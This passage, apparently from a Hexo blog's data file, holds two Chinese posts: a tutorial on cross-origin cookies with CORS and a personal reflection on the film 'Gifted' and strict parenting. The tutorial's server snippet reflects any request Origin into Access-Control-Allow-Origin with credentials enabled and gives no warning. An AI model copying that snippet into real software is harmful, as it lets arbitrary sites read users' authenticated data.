`true`。\n\n前端xhr设置\n````\nurl: settings_1.settings.pathAPI + path,\nmethod: 'post',\ndata: { },\ntransformRequest: [\n    function (data) { }\n],\nwithCredentials: true, // [开启 跨站点 证书 访问控制]\nheaders: { 'Content-Type': 'application/x-www-form-urlencoded' }\n````\n[开启 跨站点 证书 访问控制](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/withCredentials)\n\n---\n2.服务端,响应中必须携带 `Access-Control-Allow-Credentials: true` 首部。  \n如果服务端的响应中未携带`Access-Control-Allow-Credentials: true` 首部，浏览器将不会把响应的内容返回给发送者。\n\n服务器跨域设置\n````\nlet url = requestData.getHeader(\"Origin\");\n// console.log(\"OriginUrl::\", url);\n\nresponseData.setHeader('Access-Control-Allow-Origin', url)\nresponseData.setHeader('Access-Control-Allow-Methods', 'POST')\nresponseData.setHeader('Access-Control-Allow-Headers', 'x-requested-with,content-type')\nresponseData.setHeader(\"Access-Control-ALLOW-Credentials\", \"true\") // 跨域设置cookie\nresponseData.renderJSON(callback)\n````\n---\n\n**总结**要想`设置和获取跨域 Cookie`，上面提到的两点缺一不可。  \n另外有一点需要注意的是：规范中提到，如果 `XMLHttpRequest` 请求设置了 `withCredentials` 属性，那么服务器不得设置 `Access-Control-Allow-Origin的值为*` ，否则浏览器将会抛出`The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*'` 错误。\n\n---\n\n[参考文献](https://www.cnblogs.com/zhangcybb/p/6594991.html)\n\n[作者：ken_ljq; 來源：简书](https://www.jianshu.com/p/13d53acc124f)\n","source":"_posts/HTTP/跨域创建Cookie.md","raw":"---\ntitle: 跨域创建Cookie\ndate: 2018-07-27 11:21:49\ntags: 跨域创建Cookie\ncategories: Cookie HTTP\n---\n## 跨域创建Cookie\n\n要想浏览器处理 CORS 跨域中的 Cookie 只需要分别在网页以及服务端作出一点点改变：\n\n1.前端，对于跨域的 XMLHttpRequest 请求，需要设置 `withCredentials` 属性为 `true`。\n\n前端xhr设置\n````\nurl: settings_1.settings.pathAPI + path,\nmethod: 'post',\ndata: { },\ntransformRequest: [\n    function (data) { }\n],\nwithCredentials: true, // [开启 跨站点 证书 访问控制]\nheaders: { 'Content-Type': 'application/x-www-form-urlencoded' }\n````\n[开启 跨站点 证书 访问控制](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/withCredentials)\n\n---\n2.服务端,响应中必须携带 `Access-Control-Allow-Credentials: true` 首部。  \n如果服务端的响应中未携带`Access-Control-Allow-Credentials: true` 首部，浏览器将不会把响应的内容返回给发送者。\n\n服务器跨域设置\n````\nlet url = requestData.getHeader(\"Origin\");\n// console.log(\"OriginUrl::\", url);\n\nresponseData.setHeader('Access-Control-Allow-Origin', url)\nresponseData.setHeader('Access-Control-Allow-Methods', 'POST')\nresponseData.setHeader('Access-Control-Allow-Headers', 'x-requested-with,content-type')\nresponseData.setHeader(\"Access-Control-ALLOW-Credentials\", \"true\") // 跨域设置cookie\nresponseData.renderJSON(callback)\n````\n---\n\n**总结**要想`设置和获取跨域 Cookie`，上面提到的两点缺一不可。  \n另外有一点需要注意的是：规范中提到，如果 `XMLHttpRequest` 请求设置了 `withCredentials` 属性，那么服务器不得设置 `Access-Control-Allow-Origin的值为*` ，否则浏览器将会抛出`The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*'` 错误。\n\n---\n\n[参考文献](https://www.cnblogs.com/zhangcybb/p/6594991.html)\n\n[作者：ken_ljq; 來源：简书](https://www.jianshu.com/p/13d53acc124f)\n","slug":"HTTP/跨域创建Cookie","published":1,"updated":"2018-09-05T06:33:18.492Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxw8004azodv4aqq0av5","content":"<h2 id=\"跨域创建Cookie\"><a href=\"#跨域创建Cookie\" class=\"headerlink\" title=\"跨域创建Cookie\"></a>跨域创建Cookie</h2><p>要想浏览器处理 CORS 跨域中的 Cookie 只需要分别在网页以及服务端作出一点点改变：</p>\n<p>1.前端，对于跨域的 XMLHttpRequest 请求，需要设置 <code>withCredentials</code> 属性为 <code>true</code>。</p>\n<p>前端xhr设置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url: settings_1.settings.pathAPI + path,</span><br><span class=\"line\">method: &apos;post&apos;,</span><br><span class=\"line\">data: &#123; &#125;,</span><br><span class=\"line\">transformRequest: [</span><br><span class=\"line\">    function (data) &#123; &#125;</span><br><span class=\"line\">],</span><br><span class=\"line\">withCredentials: true, // [开启 跨站点 证书 访问控制]</span><br><span class=\"line\">headers: &#123; &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos; &#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/withCredentials\" target=\"_blank\" rel=\"noopener\">开启 跨站点 证书 访问控制</a></p>\n<hr>\n<p>2.服务端,响应中必须携带 <code>Access-Control-Allow-Credentials: true</code> 首部。<br>如果服务端的响应中未携带<code>Access-Control-Allow-Credentials: true</code> 首部，浏览器将不会把响应的内容返回给发送者。</p>\n<p>服务器跨域设置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let url = requestData.getHeader(&quot;Origin&quot;);</span><br><span class=\"line\">// console.log(&quot;OriginUrl::&quot;, url);</span><br><span class=\"line\"></span><br><span class=\"line\">responseData.setHeader(&apos;Access-Control-Allow-Origin&apos;, url)</span><br><span class=\"line\">responseData.setHeader(&apos;Access-Control-Allow-Methods&apos;, &apos;POST&apos;)</span><br><span class=\"line\">responseData.setHeader(&apos;Access-Control-Allow-Headers&apos;, &apos;x-requested-with,content-type&apos;)</span><br><span class=\"line\">responseData.setHeader(&quot;Access-Control-ALLOW-Credentials&quot;, &quot;true&quot;) // 跨域设置cookie</span><br><span class=\"line\">responseData.renderJSON(callback)</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p><strong>总结</strong>要想<code>设置和获取跨域 Cookie</code>，上面提到的两点缺一不可。<br>另外有一点需要注意的是：规范中提到，如果 <code>XMLHttpRequest</code> 请求设置了 <code>withCredentials</code> 属性，那么服务器不得设置 <code>Access-Control-Allow-Origin的值为*</code> ，否则浏览器将会抛出<code>The value of the &#39;Access-Control-Allow-Origin&#39; header in the response must not be the wildcard &#39;*&#39;</code> 错误。</p>\n<hr>\n<p><a href=\"https://www.cnblogs.com/zhangcybb/p/6594991.html\" target=\"_blank\" rel=\"noopener\">参考文献</a></p>\n<p><a href=\"https://www.jianshu.com/p/13d53acc124f\" target=\"_blank\" rel=\"noopener\">作者：ken_ljq; 來源：简书</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"跨域创建Cookie\"><a href=\"#跨域创建Cookie\" class=\"headerlink\" title=\"跨域创建Cookie\"></a>跨域创建Cookie</h2><p>要想浏览器处理 CORS 跨域中的 Cookie 只需要分别在网页以及服务端作出一点点改变：</p>\n<p>1.前端，对于跨域的 XMLHttpRequest 请求，需要设置 <code>withCredentials</code> 属性为 <code>true</code>。</p>\n<p>前端xhr设置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url: settings_1.settings.pathAPI + path,</span><br><span class=\"line\">method: &apos;post&apos;,</span><br><span class=\"line\">data: &#123; &#125;,</span><br><span class=\"line\">transformRequest: [</span><br><span class=\"line\">    function (data) &#123; &#125;</span><br><span class=\"line\">],</span><br><span class=\"line\">withCredentials: true, // [开启 跨站点 证书 访问控制]</span><br><span class=\"line\">headers: &#123; &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos; &#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/withCredentials\" target=\"_blank\" rel=\"noopener\">开启 跨站点 证书 访问控制</a></p>\n<hr>\n<p>2.服务端,响应中必须携带 <code>Access-Control-Allow-Credentials: true</code> 首部。<br>如果服务端的响应中未携带<code>Access-Control-Allow-Credentials: true</code> 首部，浏览器将不会把响应的内容返回给发送者。</p>\n<p>服务器跨域设置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let url = requestData.getHeader(&quot;Origin&quot;);</span><br><span class=\"line\">// console.log(&quot;OriginUrl::&quot;, url);</span><br><span class=\"line\"></span><br><span class=\"line\">responseData.setHeader(&apos;Access-Control-Allow-Origin&apos;, url)</span><br><span class=\"line\">responseData.setHeader(&apos;Access-Control-Allow-Methods&apos;, &apos;POST&apos;)</span><br><span class=\"line\">responseData.setHeader(&apos;Access-Control-Allow-Headers&apos;, &apos;x-requested-with,content-type&apos;)</span><br><span class=\"line\">responseData.setHeader(&quot;Access-Control-ALLOW-Credentials&quot;, &quot;true&quot;) // 跨域设置cookie</span><br><span class=\"line\">responseData.renderJSON(callback)</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p><strong>总结</strong>要想<code>设置和获取跨域 Cookie</code>，上面提到的两点缺一不可。<br>另外有一点需要注意的是：规范中提到，如果 <code>XMLHttpRequest</code> 请求设置了 <code>withCredentials</code> 属性，那么服务器不得设置 <code>Access-Control-Allow-Origin的值为*</code> ，否则浏览器将会抛出<code>The value of the &#39;Access-Control-Allow-Origin&#39; header in the response must not be the wildcard &#39;*&#39;</code> 错误。</p>\n<hr>\n<p><a href=\"https://www.cnblogs.com/zhangcybb/p/6594991.html\" target=\"_blank\" rel=\"noopener\">参考文献</a></p>\n<p><a href=\"https://www.jianshu.com/p/13d53acc124f\" target=\"_blank\" rel=\"noopener\">作者：ken_ljq; 來源：简书</a></p>\n"},{"title":"天才少女观影感","date":"2018-06-05T05:56:38.000Z","_content":"\n回复：\n\n>你的文章，我读了两遍。其中提到的《摔跤》的论点，还有你的那段 描写自己 努力学正常人走路的文字，引起了我的深思。\n\n>望子成龙 基本上是 每个父母的 `核心价值观之一`。 但是 `方式方法、实现途径` 却是 `各显神通`。 有一些做法 确实得到了大众的认可， 但既然有 被主流接受的做法，那就有 值得批判的做法。[这一段写 对事物进行两面性分析]\n\n>很明显 从博主的文字中，我 `粗浅的` 觉得博主属于后者 ( 值得批判的做法 ) 。毕竟话说那么绝对，也不是什么好事。我觉得博主的文采还是跟童年经历有些关系的吧。不过，通过博主以上的描述，我还是觉得博主的父亲还是有些不可取的地方的。[这一段主要是 同情博主，其实我也有类似的童年经历]\n\n>从博主描述的自身经历，以及抛出的两个论据来看，不被接受的教育方式大多是 **`专制` `武断` `不民主` `缺少爱`** 的。当然还有 **`溺爱` `过分的表扬` `没有正确主流价值观的爱`** 等等。。。[这一段想找出 究竟什么是 我们认为的 `坏的教育方式`]\n\n>首先我不反对，专制的父爱。但是专制不代表可以无所谓的伤害。我认为在专制的过程中还要 `激发` 被专制者的`认同`或者`反抗心理`。(好的专制题材的电影会给我们观影者，以及被专制者明白，这么对待他可能是不正确的，可能是一种极端的做法。那么你来反抗，来推翻我的专制。代表作品就是《摔跤》、《爆裂鼓手》) [这一段想表达 就算是不被主流接受的教育方式 也存在很多不同。正是这些不同，造成了 有的人成功，有的人失败。当然成功和失败也只是从某种单一角度来定义的。] \n\n>罗振宇说过 `人类和机器` (人工智能) 认知世界的区别就是 人类是通过把所有`复杂的事情简化`，而机器却是把所有简单的事情，复杂化。今天讨论的主体不是人工智能， 所以我想说的是，人类把事情简化的认知世界的方式其实是不完美的，但毕竟我们大脑的认知能力和带宽有限。没办法只能这样 把所有事情 分成 `黑/白  对/错` 这种简单抽象的 概念，我们并没有能力去注意分辨、辩驳，那会消耗我们大量的时间 与 精力， 就像美国的法律 只会根据 一些定义好的条条框框来判断，你是否是一个合格的父母，这是我们简化认知的结果，但是带来的弊端就是 这种做法不那么准确，或者说完美。 这个世界是多元的。每个人，每种方式，只是类似，并不完全相同。甚至相同的方法，对待不同的人，都会产生不同的效果。就像《摔跤》的方式方法虽然看似粗暴，但影片中的 汉米尔 是 正确 和 不被庸众 所接受的 一个具象化符号。 [这一段 是对上一段 论证的 加强。我们不能用非黑即白的眼光看待这个世界。有些大体上看似 跟 错误的做法类似的行为，不一定就同样是错的。因为它里面的细节，千丝万缕那才是真正需要我们去用理性分析的。]\n\n>有付出就有回报，天才都是高压下的产物。如果想要成就不凡，那必须有付出代价的觉悟。当然很多电影宣传 希望主人公 过普通人的生活，平淡、快乐的一生，也没有错误。每个人生来都有选择自己 生活方式 的权利，不过前提是你有的选。\n\n\n>最后说一句，博主文章中有一段说，\n````\n版权归作者所有，任何形式转载请联系作者。\n作者：张天翼（来自豆瓣）\n来源：https://movie.douban.com/review/8524953/\n\n\n这样会耽误了天才的发展吗？会让人类文明晚前进若干年吗？不会！莫言从小找不到书读也成了莫言。再说，人类的文明进程真是靠天才在推进？也许某个时间点上某个天才的某项发现确实推了它一把，但“前进”是历史的必然。有你没你，人类最终都会吃上熟食、用上电灯、开上汽车、连上互联网。也许，也许我们会失去一个莫扎特，但那只是“也许”！\n````\n我觉得 像`图灵`和`乔布斯`这样的人，可能不是唯一能改变世界的人。但是如果世界上像他们这样的人(上面提到的两位大神)都觉得可能会有其他人愿意或者有可能，来改变这个世界，我只需要当个快乐的普通人来享受就好了。我们现在可能真的有可能还在泥地里爬行。。。俗话说天塌了有个子高的人顶着，这句话是最冷漠以及事不关己高高挂起的 话了。就像革命先烈一样，如果没有无数像 `董存瑞` `黄继光` `邱少云`这样的人，我们现在的祖国会是个什么样子祖国。可能我也依然会很幸福，会很爱她吧。不想改变世界，没有承担痛苦的觉悟也就只能做一个普普通通的 普通 人了。这并没有什么不好\n\n我也是一个爱啰嗦的人，但是前提是有足够新颖和话题能打动我。很明显，和博主类似的童年经历，以及博主精彩的文字 吸引 并且打动了我。一切的想法，都恨幼稚，都是心直口快的产物。都是渴望找到认同的行为。尽量不去使用偏激的语言，避免造成不必要的冲突。\n\n如果看到我文字的人，觉得啰嗦。每一段 最后的 “[]” 里面有我对当前段落的总结。\n\n欢迎大家和我探讨。\n","source":"_posts/Movie/天才少女观影感.md","raw":"---\ntitle: 天才少女观影感\ndate: 2018-06-05 13:56:38\ntags:\ncategories:\n---\n\n回复：\n\n>你的文章，我读了两遍。其中提到的《摔跤》的论点，还有你的那段 描写自己 努力学正常人走路的文字，引起了我的深思。\n\n>望子成龙 基本上是 每个父母的 `核心价值观之一`。 但是 `方式方法、实现途径` 却是 `各显神通`。 有一些做法 确实得到了大众的认可， 但既然有 被主流接受的做法，那就有 值得批判的做法。[这一段写 对事物进行两面性分析]\n\n>很明显 从博主的文字中，我 `粗浅的` 觉得博主属于后者 ( 值得批判的做法 ) 。毕竟话说那么绝对，也不是什么好事。我觉得博主的文采还是跟童年经历有些关系的吧。不过，通过博主以上的描述，我还是觉得博主的父亲还是有些不可取的地方的。[这一段主要是 同情博主，其实我也有类似的童年经历]\n\n>从博主描述的自身经历，以及抛出的两个论据来看，不被接受的教育方式大多是 **`专制` `武断` `不民主` `缺少爱`** 的。当然还有 **`溺爱` `过分的表扬` `没有正确主流价值观的爱`** 等等。。。[这一段想找出 究竟什么是 我们认为的 `坏的教育方式`]\n\n>首先我不反对，专制的父爱。但是专制不代表可以无所谓的伤害。我认为在专制的过程中还要 `激发` 被专制者的`认同`或者`反抗心理`。(好的专制题材的电影会给我们观影者，以及被专制者明白，这么对待他可能是不正确的，可能是一种极端的做法。那么你来反抗，来推翻我的专制。代表作品就是《摔跤》、《爆裂鼓手》) [这一段想表达 就算是不被主流接受的教育方式 也存在很多不同。正是这些不同，造成了 有的人成功，有的人失败。当然成功和失败也只是从某种单一角度来定义的。] \n\n>罗振宇说过 `人类和机器` (人工智能) 认知世界的区别就是 人类是通过把所有`复杂的事情简化`，而机器却是把所有简单的事情，复杂化。今天讨论的主体不是人工智能， 所以我想说的是，人类把事情简化的认知世界的方式其实是不完美的，但毕竟我们大脑的认知能力和带宽有限。没办法只能这样 把所有事情 分成 `黑/白  对/错` 这种简单抽象的 概念，我们并没有能力去注意分辨、辩驳，那会消耗我们大量的时间 与 精力， 就像美国的法律 只会根据 一些定义好的条条框框来判断，你是否是一个合格的父母，这是我们简化认知的结果，但是带来的弊端就是 这种做法不那么准确，或者说完美。 这个世界是多元的。每个人，每种方式，只是类似，并不完全相同。甚至相同的方法，对待不同的人，都会产生不同的效果。就像《摔跤》的方式方法虽然看似粗暴，但影片中的 汉米尔 是 正确 和 不被庸众 所接受的 一个具象化符号。 [这一段 是对上一段 论证的 加强。我们不能用非黑即白的眼光看待这个世界。有些大体上看似 跟 错误的做法类似的行为，不一定就同样是错的。因为它里面的细节，千丝万缕那才是真正需要我们去用理性分析的。]\n\n>有付出就有回报，天才都是高压下的产物。如果想要成就不凡，那必须有付出代价的觉悟。当然很多电影宣传 希望主人公 过普通人的生活，平淡、快乐的一生，也没有错误。每个人生来都有选择自己 生活方式 的权利，不过前提是你有的选。\n\n\n>最后说一句，博主文章中有一段说，\n````\n版权归作者所有，任何形式转载请联系作者。\n作者：张天翼（来自豆瓣）\n来源：https://movie.douban.com/review/8524953/\n\n\n这样会耽误了天才的发展吗？会让人类文明晚前进若干年吗？不会！莫言从小找不到书读也成了莫言。再说，人类的文明进程真是靠天才在推进？也许某个时间点上某个天才的某项发现确实推了它一把，但“前进”是历史的必然。有你没你，人类最终都会吃上熟食、用上电灯、开上汽车、连上互联网。也许，也许我们会失去一个莫扎特，但那只是“也许”！\n````\n我觉得 像`图灵`和`乔布斯`这样的人，可能不是唯一能改变世界的人。但是如果世界上像他们这样的人(上面提到的两位大神)都觉得可能会有其他人愿意或者有可能，来改变这个世界，我只需要当个快乐的普通人来享受就好了。我们现在可能真的有可能还在泥地里爬行。。。俗话说天塌了有个子高的人顶着，这句话是最冷漠以及事不关己高高挂起的 话了。就像革命先烈一样，如果没有无数像 `董存瑞` `黄继光` `邱少云`这样的人，我们现在的祖国会是个什么样子祖国。可能我也依然会很幸福，会很爱她吧。不想改变世界，没有承担痛苦的觉悟也就只能做一个普普通通的 普通 人了。这并没有什么不好\n\n我也是一个爱啰嗦的人，但是前提是有足够新颖和话题能打动我。很明显，和博主类似的童年经历，以及博主精彩的文字 吸引 并且打动了我。一切的想法，都恨幼稚，都是心直口快的产物。都是渴望找到认同的行为。尽量不去使用偏激的语言，避免造成不必要的冲突。\n\n如果看到我文字的人，觉得啰嗦。每一段 最后的 “[]” 里面有我对当前段落的总结。\n\n欢迎大家和我探讨。\n","slug":"Movie/天才少女观影感","published":1,"updated":"2018-09-05T06:33:18.492Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwb004ezodv2erad0sl","content":"<p>回复：</p>\n<blockquote>\n<p>你的文章，我读了两遍。其中提到的《摔跤》的论点，还有你的那段 描写自己 努力学正常人走路的文字，引起了我的深思。</p>\n<p>望子成龙 基本上是 每个父母的 <code>核心价值观之一</code>。 但是 <code>方式方法、实现途径</code> 却是 <code>各显神通</code>。 有一些做法 确实得到了大众的认可， 但既然有 被主流接受的做法，那就有 值得批判的做法。[这一段写 对事物进行两面性分析]</p>\n<p>很明显 从博主的文字中，我 <code>粗浅的</code> 觉得博主属于后者 ( 值得批判的做法 ) 。毕竟话说那么绝对，也不是什么好事。我觉得博主的文采还是跟童年经历有些关系的吧。不过，通过博主以上的描述，我还是觉得博主的父亲还是有些不可取的地方的。[这一段主要是 同情博主，其实我也有类似的童年经历]</p>\n<p>从博主描述的自身经历，以及抛出的两个论据来看，不被接受的教育方式大多是 <strong><code>专制</code> <code>武断</code> <code>不民主</code> <code>缺少爱</code></strong> 的。当然还有 <strong><code>溺爱</code> <code>过分的表扬</code> <code>没有正确主流价值观的爱</code></strong> 等等。。。[这一段想找出 究竟什么是 我们认为的 <code>坏的教育方式</code>]</p>\n<p>首先我不反对，专制的父爱。但是专制不代表可以无所谓的伤害。我认为在专制的过程中还要 <code>激发</code> 被专制者的<code>认同</code>或者<code>反抗心理</code>。(好的专制题材的电影会给我们观影者，以及被专制者明白，这么对待他可能是不正确的，可能是一种极端的做法。那么你来反抗，来推翻我的专制。代表作品就是《摔跤》、《爆裂鼓手》) [这一段想表达 就算是不被主流接受的教育方式 也存在很多不同。正是这些不同，造成了 有的人成功，有的人失败。当然成功和失败也只是从某种单一角度来定义的。] </p>\n<p>罗振宇说过 <code>人类和机器</code> (人工智能) 认知世界的区别就是 人类是通过把所有<code>复杂的事情简化</code>，而机器却是把所有简单的事情，复杂化。今天讨论的主体不是人工智能， 所以我想说的是，人类把事情简化的认知世界的方式其实是不完美的，但毕竟我们大脑的认知能力和带宽有限。没办法只能这样 把所有事情 分成 <code>黑/白  对/错</code> 这种简单抽象的 概念，我们并没有能力去注意分辨、辩驳，那会消耗我们大量的时间 与 精力， 就像美国的法律 只会根据 一些定义好的条条框框来判断，你是否是一个合格的父母，这是我们简化认知的结果，但是带来的弊端就是 这种做法不那么准确，或者说完美。 这个世界是多元的。每个人，每种方式，只是类似，并不完全相同。甚至相同的方法，对待不同的人，都会产生不同的效果。就像《摔跤》的方式方法虽然看似粗暴，但影片中的 汉米尔 是 正确 和 不被庸众 所接受的 一个具象化符号。 [这一段 是对上一段 论证的 加强。我们不能用非黑即白的眼光看待这个世界。有些大体上看似 跟 错误的做法类似的行为，不一定就同样是错的。因为它里面的细节，千丝万缕那才是真正需要我们去用理性分析的。]</p>\n<p>有付出就有回报，天才都是高压下的产物。如果想要成就不凡，那必须有付出代价的觉悟。当然很多电影宣传 希望主人公 过普通人的生活，平淡、快乐的一生，也没有错误。每个人生来都有选择自己 生活方式 的权利，不过前提是你有的选。</p>\n<p>最后说一句，博主文章中有一段说，<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">版权归作者所有，任何形式转载请联系作者。</span><br><span class=\"line\">作者：张天翼（来自豆瓣）</span><br><span class=\"line\">来源：https://movie.douban.com/review/8524953/</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这样会耽误了天才的发展吗？会让人类文明晚前进若干年吗？不会！莫言从小找不到书读也成了莫言。再说，人类的文明进程真是靠天才在推进？也许某个时间点上某个天才的某项发现确实推了它一把，但“前进”是历史的必然。有你没你，人类最终都会吃上熟食、用上电灯、开上汽车、连上互联网。也许，也许我们会失去一个莫扎特，但那只是“也许”！</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>我觉得 像<code>图灵</code>和<code>乔布斯</code>这样的人，可能不是唯一能改变世界的人。但是如果世界上像他们这样的人(上面提到的两位大神)都觉得可能会有其他人愿意或者有可能，来改变这个世界，我只需要当个快乐的普通人来享受就好了。我们现在可能真的有可能还在泥地里爬行。。。俗话说天塌了有个子高的人顶着，这句话是最冷漠以及事不关己高高挂起的 话了。就像革命先烈一样，如果没有无数像 <code>董存瑞</code> <code>黄继光</code> <code>邱少云</code>这样的人，我们现在的祖国会是个什么样子祖国。可能我也依然会很幸福，会很爱她吧。不想改变世界，没有承担痛苦的觉悟也就只能做一个普普通通的 普通 人了。这并没有什么不好</p>\n<p>我也是一个爱啰嗦的人，但是前提是有足够新颖和话题能打动我。很明显，和博主类似的童年经历，以及博主精彩的文字 吸引 并且打动了我。一切的想法，都恨幼稚，都是心直口快的产物。都是渴望找到认同的行为。尽量不去使用偏激的语言，避免造成不必要的冲突。</p>\n<p>如果看到我文字的人，觉得啰嗦。每一段 最后的 “[]” 里面有我对当前段落的总结。</p>\n<p>欢迎大家和我探讨。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>回复：</p>\n<blockquote>\n<p>你的文章，我读了两遍。其中提到的《摔跤》的论点，还有你的那段 描写自己 努力学正常人走路的文字，引起了我的深思。</p>\n<p>望子成龙 基本上是 每个父母的 <code>核心价值观之一</code>。 但是 <code>方式方法、实现途径</code> 却是 <code>各显神通</code>。 有一些做法 确实得到了大众的认可， 但既然有 被主流接受的做法，那就有 值得批判的做法。[这一段写 对事物进行两面性分析]</p>\n<p>很明显 从博主的文字中，我 <code>粗浅的</code> 觉得博主属于后者 ( 值得批判的做法 ) 。毕竟话说那么绝对，也不是什么好事。我觉得博主的文采还是跟童年经历有些关系的吧。不过，通过博主以上的描述，我还是觉得博主的父亲还是有些不可取的地方的。[这一段主要是 同情博主，其实我也有类似的童年经历]</p>\n<p>从博主描述的自身经历，以及抛出的两个论据来看，不被接受的教育方式大多是 <strong><code>专制</code> <code>武断</code> <code>不民主</code> <code>缺少爱</code></strong> 的。当然还有 <strong><code>溺爱</code> <code>过分的表扬</code> <code>没有正确主流价值观的爱</code></strong> 等等。。。[这一段想找出 究竟什么是 我们认为的 <code>坏的教育方式</code>]</p>\n<p>首先我不反对，专制的父爱。但是专制不代表可以无所谓的伤害。我认为在专制的过程中还要 <code>激发</code> 被专制者的<code>认同</code>或者<code>反抗心理</code>。(好的专制题材的电影会给我们观影者，以及被专制者明白，这么对待他可能是不正确的，可能是一种极端的做法。那么你来反抗，来推翻我的专制。代表作品就是《摔跤》、《爆裂鼓手》) [这一段想表达 就算是不被主流接受的教育方式 也存在很多不同。正是这些不同，造成了 有的人成功，有的人失败。当然成功和失败也只是从某种单一角度来定义的。] </p>\n<p>罗振宇说过 <code>人类和机器</code> (人工智能) 认知世界的区别就是 人类是通过把所有<code>复杂的事情简化</code>，而机器却是把所有简单的事情，复杂化。今天讨论的主体不是人工智能， 所以我想说的是，人类把事情简化的认知世界的方式其实是不完美的，但毕竟我们大脑的认知能力和带宽有限。没办法只能这样 把所有事情 分成 <code>黑/白  对/错</code> 这种简单抽象的 概念，我们并没有能力去注意分辨、辩驳，那会消耗我们大量的时间 与 精力， 就像美国的法律 只会根据 一些定义好的条条框框来判断，你是否是一个合格的父母，这是我们简化认知的结果，但是带来的弊端就是 这种做法不那么准确，或者说完美。 这个世界是多元的。每个人，每种方式，只是类似，并不完全相同。甚至相同的方法，对待不同的人，都会产生不同的效果。就像《摔跤》的方式方法虽然看似粗暴，但影片中的 汉米尔 是 正确 和 不被庸众 所接受的 一个具象化符号。 [这一段 是对上一段 论证的 加强。我们不能用非黑即白的眼光看待这个世界。有些大体上看似 跟 错误的做法类似的行为，不一定就同样是错的。因为它里面的细节，千丝万缕那才是真正需要我们去用理性分析的。]</p>\n<p>有付出就有回报，天才都是高压下的产物。如果想要成就不凡，那必须有付出代价的觉悟。当然很多电影宣传 希望主人公 过普通人的生活，平淡、快乐的一生，也没有错误。每个人生来都有选择自己 生活方式 的权利，不过前提是你有的选。</p>\n<p>最后说一句，博主文章中有一段说，<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">版权归作者所有，任何形式转载请联系作者。</span><br><span class=\"line\">作者：张天翼（来自豆瓣）</span><br><span class=\"line\">来源：https://movie.douban.com/review/8524953/</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这样会耽误了天才的发展吗？会让人类文明晚前进若干年吗？不会！莫言从小找不到书读也成了莫言。再说，人类的文明进程真是靠天才在推进？也许某个时间点上某个天才的某项发现确实推了它一把，但“前进”是历史的必然。有你没你，人类最终都会吃上熟食、用上电灯、开上汽车、连上互联网。也许，也许我们会失去一个莫扎特，但那只是“也许”！</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>我觉得 像<code>图灵</code>和<code>乔布斯</code>这样的人，可能不是唯一能改变世界的人。但是如果世界上像他们这样的人(上面提到的两位大神)都觉得可能会有其他人愿意或者有可能，来改变这个世界，我只需要当个快乐的普通人来享受就好了。我们现在可能真的有可能还在泥地里爬行。。。俗话说天塌了有个子高的人顶着，这句话是最冷漠以及事不关己高高挂起的 话了。就像革命先烈一样，如果没有无数像 <code>董存瑞</code> <code>黄继光</code> <code>邱少云</code>这样的人，我们现在的祖国会是个什么样子祖国。可能我也依然会很幸福，会很爱她吧。不想改变世界，没有承担痛苦的觉悟也就只能做一个普普通通的 普通 人了。这并没有什么不好</p>\n<p>我也是一个爱啰嗦的人，但是前提是有足够新颖和话题能打动我。很明显，和博主类似的童年经历，以及博主精彩的文字 吸引 并且打动了我。一切的想法，都恨幼稚，都是心直口快的产物。都是渴望找到认同的行为。尽量不去使用偏激的语言，避免造成不必要的冲突。</p>\n<p>如果看到我文字的人，觉得啰嗦。每一段 最后的 “[]” 